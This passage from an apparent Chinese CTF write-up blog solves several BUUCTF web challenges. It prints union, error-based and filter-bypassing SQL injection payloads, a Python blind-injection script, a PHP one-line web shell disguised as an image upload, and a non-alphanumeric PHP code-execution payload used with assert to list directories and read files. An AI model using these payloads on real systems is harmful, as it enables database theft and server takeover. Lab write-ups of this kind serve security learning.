alt=\"\"></p>\n<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code></p>\n<p><img src=\"/pic/39.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li><h4 id=\"union确定回显，回显位置为2，3\"><a href=\"#union确定回显，回显位置为2，3\" class=\"headerlink\" title=\"union确定回显，回显位置为2，3\"></a>union确定回显，回显位置为2，3</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,2,3+%23&amp;password=123</code></p>\n<p><img src=\"/pic/40.png\" alt=\"\"></p>\n<ol start=\"3\">\n<li><h4 id=\"查数据库\"><a href=\"#查数据库\" class=\"headerlink\" title=\"查数据库\"></a>查数据库</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,database(),3+%23&amp;password=123</code></p>\n<p><img src=\"/pic/41.png\" alt=\"\"></p>\n<ol start=\"4\">\n<li><h4 id=\"查表\"><a href=\"#查表\" class=\"headerlink\" title=\"查表\"></a>查表</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=&#39;geek&#39;+%23&amp;password=123</code></p>\n<p><img src=\"/pic/42.png\" alt=\"\"></p>\n<p>l0ve1ysq1、geekuser</p>\n<ol start=\"5\">\n<li><h4 id=\"查列名\"><a href=\"#查列名\" class=\"headerlink\" title=\"查列名\"></a>查列名</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;l0ve1ysq1&#39;+%23&amp;password=123</code></p>\n<p><img src=\"/pic/43.png\" alt=\"\"></p>\n<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;geekuser&#39;+%23&amp;password=123</code></p>\n<p><img src=\"/pic/44.png\" alt=\"\"></p>\n<ol start=\"6\">\n<li><h4 id=\"查数据\"><a href=\"#查数据\" class=\"headerlink\" title=\"查数据\"></a>查数据</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+geekuser+limit+0,1+%23&amp;password=123</code></p>\n<p>geekuser只有一个admin</p>\n<p><img src=\"/pic/45.png\" alt=\"\"></p>\n<p>l0ve1ysq1表中发现了flag</p>\n<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code> </p>\n<p><img src=\"/pic/46.png\" alt=\"\"></p>\n<h3 id=\"BabySQL\"><a href=\"#BabySQL\" class=\"headerlink\" title=\"BabySQL\"></a>BabySQL</h3><p>fuzzing一下，将union,select,and,or,where,from删除</p>\n<p>此时可以selselectect将select删除之后就变成了sel <del>select</del> ect</p>\n<p>因为和上面的一样，直接查询数据库</p>\n<ol>\n<li><h4 id=\"查数据库-1\"><a href=\"#查数据库-1\" class=\"headerlink\" title=\"查数据库\"></a>查数据库</h4></li>\n</ol>\n<p><code>?username=&#39;uniunionon+selselectect+1,database(),3--+&amp;password=123</code></p>\n<p>数据库名还是geek</p>\n<ol start=\"2\">\n<li><h4 id=\"查询表\"><a href=\"#查询表\" class=\"headerlink\" title=\"查询表\"></a>查询表</h4></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username&#x3D;&#39;uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema&#x3D;&#39;geek&#39;--+&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>\n\n<p>b4bsql,geekuser</p>\n<ol start=\"3\">\n<li><h4 id=\"查列名-1\"><a href=\"#查列名-1\" class=\"headerlink\" title=\"查列名\"></a>查列名</h4></li>\n</ol>\n<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema=&#39;geek&#39;+anandd+table_name=&#39;b4bsql&#39;--+&amp;password=123</code></p>\n<p>列名还是id,username,password</p>\n<ol start=\"4\">\n<li><h4 id=\"查询数据\"><a href=\"#查询数据\" class=\"headerlink\" title=\"查询数据\"></a>查询数据</h4></li>\n</ol>\n<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&amp;password=123</code></p>\n<p><img src=\"/pic/47.png\" alt=\"\"></p>\n<p>成功拿到flag</p>\n<h3 id=\"Http\"><a href=\"#Http\" class=\"headerlink\" title=\"Http\"></a>Http</h3><p>打开BP，开启拦截，查看site map发现有一个secret.php</p>\n<p><img src=\"/pic/48.png\" alt=\"\"></p>\n<p>访问即可</p>\n<p>根据提示修改http头</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/Secret.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: node3.buuoj.cn:27400</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: */*</span><br><span class=\"line\"><span class=\"attribute\">X-Forwarded-for:127.0.0.1</span></span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: en</span><br><span class=\"line\"><span class=\"attribute\">Referer:https://www.Sycsecret.com</span></span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"BuyFlag\"><a href=\"#BuyFlag\" class=\"headerlink\" title=\"BuyFlag\"></a>BuyFlag</h3><p>点进去有一个payflag界面,</p>\n<p>根据提示，</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">If you want to buy the FLAG:</span><br><span class=\"line\">You must be a student from CUIT!!!</span><br><span class=\"line\">You must be answer the correct password!!! </span><br><span class=\"line\"></span><br><span class=\"line\">Only Cuit's students can buy the FLAG</span><br></pre></td></tr></table></figure>\n\n<p>页面最后有一段注释</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">\t~~~post money and password~~~</span></span><br><span class=\"line\"><span class=\"comment\">if (isset($_POST['password'])) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t$password = $_POST['password'];</span></span><br><span class=\"line\"><span class=\"comment\">\tif (is_numeric($password)) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\techo \"password can't be number&lt;/br&gt;\";</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;elseif ($password == 404) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\techo \"Password Right!&lt;/br&gt;\";</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这一段注释是对输入的<code>password</code>作比较，输入的是404，且能绕过<code>is_numeric()</code>函数。</p>\n<p>在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的</p>\n<p><img src=\"/pic/49.png\" alt=\"\"></p>\n<p>抓包发现有cookie, user=0，改成=1，变成了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">you are Cuiter</span><br><span class=\"line\">Please input your password!!</span><br></pre></td></tr></table></figure>\n\n<p>传入数据<code>password=404a&amp;money=999999999</code>，他说数据太长，只能传入八位。</p>\n<p>之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过</p>\n<p><code>password=404a&amp;money[]=</code></p>\n<h3 id=\"Upload\"><a href=\"#Upload\" class=\"headerlink\" title=\"Upload\"></a>Upload</h3><p>上传PHP一句话被过滤</p>\n<p><img src=\"/pic/50.png\" alt=\"\"></p>\n<p>换成图片后缀jpg进行%00截断，还是被过滤</p>\n<p><img src=\"/pic/51.png\" alt=\"\"></p>\n<p>尝试php2,php3,php5都被过滤</p>\n<p><img src=\"/pic/52.png\" alt=\"\"></p>\n<p><img src=\"/pic/53.png\" alt=\"\"></p>\n<p><img src=\"/pic/54.png\" alt=\"\"></p>\n<p>只有phtml没有被过滤</p>\n<p><img src=\"/pic/55.png\" alt=\"\"></p>\n<p>内容不能出现<code>&lt;?</code>可以换成js的写法</p>\n<p><img src=\"/pic/56.png\" alt=\"\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=<span class=\"string\">\"php\"</span>&gt;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>($_POST[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>再上传提示必须是图片，添加gif文件头<code>GIF89a</code></p>\n<p><img src=\"/pic/57.png\" alt=\"\"></p>\n<p>使用蚁剑，菜刀连接，找到flag</p>\n<p><img src=\"/pic/58.png\" alt=\"\"></p>\n<h3 id=\"HardSQL\"><a href=\"#HardSQL\" class=\"headerlink\" title=\"HardSQL\"></a>HardSQL</h3><p>fuzz测试</p>\n<p><code>AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&amp;&amp;,&lt;,&gt;,ascii,%20,%09</code>被过滤</p>\n<p>输入错误还会报出sql语句错误，考虑报错注入</p>\n<ol>\n<li><h4 id=\"查数据库-2\"><a href=\"#查数据库-2\" class=\"headerlink\" title=\"查数据库\"></a>查数据库</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(database())),0))%23</code>还是geek</p>\n</li>\n<li><h4 id=\"查表-1\"><a href=\"#查表-1\" class=\"headerlink\" title=\"查表\"></a>查表</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0))%23</code></p>\n<p>H4rDsq1</p>\n</li>\n<li><h4 id=\"查列名（应该还是只有id-usname-password）\"><a href=\"#查列名（应该还是只有id-usname-password）\" class=\"headerlink\" title=\"查列名（应该还是只有id,usname,password）\"></a>查列名（应该还是只有id,usname,password）</h4></li>\n<li><h4 id=\"查数据-1\"><a href=\"#查数据-1\" class=\"headerlink\" title=\"查数据\"></a>查数据</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>\n<p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>\n<p>因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。</p>\n</li>\n</ol>\n<h3 id=\"FinalSQL\"><a href=\"#FinalSQL\" class=\"headerlink\" title=\"FinalSQL\"></a>FinalSQL</h3><p>fuzz之后发现被过滤的关键字有</p>\n<p><img src=\"/pic/59.png\" alt=\"\"></p>\n<p>题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框</p>\n<p><img src=\"/pic/60.png\" alt=\"\"></p>\n<p><img src=\"/pic/61.png\" alt=\"\"></p>\n<p>根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注</p>\n<p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('</span>+payload+<span class=\"string\">')'</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print('*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'others'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''</span>+db+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''</span>+table+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tabls('geek') #F1naI1y,Flaaaaag</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># get_columns('F1naI1y') # id,username,password</span></span><br><span class=\"line\"><span class=\"comment\"># get_columns('Flaaaaag') # id,fl4gawsl</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_data('fl4gawsl','Flaaaaag')</span></span><br><span class=\"line\">get_data(<span class=\"string\">'id,username,password'</span>,<span class=\"string\">'F1naI1y'</span>)</span><br></pre></td></tr></table></figure>\n\n<p>跑出来有两个表F1naI1y,Flaaaaag</p>\n<p>F1naI1y表还是只有id,username,password</p>\n<p>Flaaaaag表包括id,fl4gawsl</p>\n<h3 id=\"RCE-ME\"><a href=\"#RCE-ME\" class=\"headerlink\" title=\"RCE ME\"></a>RCE ME</h3><p>打开题目有源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'code'</span>]))&#123;</span><br><span class=\"line\">            $code=$_GET[<span class=\"string\">'code'</span>];</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(strlen($code)&gt;<span class=\"number\">40</span>)&#123;  </span><br><span class=\"line\">                                        <span class=\"keyword\">die</span>(<span class=\"string\">\"This is too Long.\"</span>);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/[A-Za-z0-9]+/\"</span>,$code))&#123;</span><br><span class=\"line\">                                        <span class=\"keyword\">die</span>(<span class=\"string\">\"NO.\"</span>);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    @<span class=\"keyword\">eval</span>($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// <span class=\"meta\">?&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p> 传入一个code参数，长度不能大于40，不能包含大小写字母和数字</p>\n<p>可以使用取反或者异或拼凑函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code&#x3D;$_&#x3D;(~?&gt;);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;_&#x3D;phpinfo()&amp;__&#x3D;assert</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%A0%AF%B0%AC%AB是_GET的取反的值，$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;)&#96;就相当于 $_GET&#123;&#39;__&#39;&#125;($_GET&#123;&#39;_&#39;&#125;)   联合起来就是assert(phpinfo())</span><br></pre></td></tr></table></figure>\n\n\n\n<p>关于assert函数**</p>\n<p>PHP 5 assert ( <a href=\"https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$assertion</code> [, string <code>$description</code> ] ) : bool</p>\n<p>PHP 7 assert ( <a href=\"https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] ) : bool</p>\n<p><strong>assert()</strong> 会检查指定的 <code>assertion</code> 并在结果为 <strong><code>FALSE</code></strong> 时采取适当的行动。</p>\n<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。 <code>assertion</code> 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 <code>assertion</code> 表达式。 这意味着如果你传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的 <a href=\"https://www.php.net/manual/zh/function.assert-options.php\" target=\"_blank\" rel=\"noopener\">assert_options()</a> 处理函数时，条件会转换为字符串，而布尔值 <strong><code>FALSE</code></strong> 会被转换成空字符串。</p>\n<p><img src=\"/pic/64.png\" alt=\"\"></p>\n<p>先查看phpinfo()</p>\n<p><img src=\"/pic/62.png\" alt=\"\"></p>\n<p>禁用了很多执行系统命令的函数</p>\n<p><img src=\"/pic/63.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>\n\n<p>扫描当前目录 </p>\n<p>post 数据： <code>_=print_r(scandir(%27./%27))&amp;__=assert</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array (    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; index.php )</span><br></pre></td></tr></table></figure>\n\n<p>扫描根目录</p>\n<p>post数据：<code>_=print_r(scandir(%27/%27))&amp;__=assert</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var )</span><br></pre></td></tr></table></figure>\n\n<p>发现有一个flag文件和一个readflag文件。尝试读取内容</p>\n<p>读取flag中的文件是空的；</p>\n<p>post数据：<code>_=var_dump(file_get_contents(%27/flag%27))&amp;__=assert</code></p>\n<p>post数据：<code>_=var_dump(file_get_contents(%27/readflag%27))&amp;__=assert</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(8856) &quot;ELF\u0002\u0001\u0001\u0003&gt;\u0001�\u0006@�\u001a@8 @\u001f\u001e\u0006\u0005@@@�\u0001�\u0001\b\u0003\u00048\u00028\u00028\u0002\u001c\u001c\u0001\u0001\u0005\f \f \u0001\u0006� � � x\u0002�\u0002 \u0002\u0006� � � �\u0001�\u0001\b\u0004\u0004T\u0002T\u0002T\u0002DD\u0004P�td\u0004�\b�\b�\b&lt;&lt;\u0004Q�td\u0006\u0010R�td\u0004� � � (\u0002(\u0002\u0001&#x2F;lib64&#x2F;ld-linux-x86-64.so.2\u0004\u0010\u0001GNU\u0002\u0006 \u0004\u0014\u0003GNU�íf­CI�&#96;[Xa\f���V�\u0001\u0001\u0001Q \u001a\u0012?\u0012m 8\u0012| � \u000b\u0012)&quot;\u0012\u0012!\u0012libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0001\u0001\u0001\u0010u\u001ai \u0002�� \b�\u0007� \b&#96;\u0007H\u0010 \bH\u0010 �\u000f \u0006\u0001�\u000f \u0006\u0003�\u000f \u0006\u0004�\u000f \u0006\u0006�\u000f \u0006\u0007�\u000f \u0006 \u0018\u0010 \u0007\u0002 \u0010 \u0007\u0005(\u0010 \u0007\b0\u0010 \u0007 8\u0010 \u0007\u000bH��\bH�\u0005� H��t\u0002��H��\b��5� �%� \u000f\u001f@�%� h������%� h\u0001������%� h\u0002������%� h\u0003�����%� h\u0004�����%b f�1�I��^H��H���PTL�\u0005�\u0001H� s\u0001H�&#x3D;\f\u0001�\u0015\u000e �\u000f\u001fDH�&#x3D;y H�\u0005y UH)�H��H��\u000ev\u0015H�\u0005�\b H��t ]��f\u000f\u001fD]�\u000f\u001f@f.\u000f\u001f�H�&#x3D;9 H�52 UH)�H��H��\u0003H��H��?H\u0001�H��t\u0018H�\u0005�\b H��t\f]��f\u000f\u001f�]�\u000f\u001f@f.\u000f\u001f��&#x3D;�\b u&#39;H�&#x3D;�\b UH��t\fH�&#x3D;�\b � ����H���]�\u0005�\b \u0001��\u000f\u001f@f.\u000f\u001f�H�&#x3D;A\u0006 H�?u\u000b�^���f\u000f\u001fDH�\u0005)\b H��t�UH����]�@���UH����������~������_������@���H�&#x3D;���\u001f����]�f.\u000f\u001f�f�AWAVA��AUATL�%�\u0005 UH�-�\u0005 SI��I��L)�H��\bH��\u0003����H��t 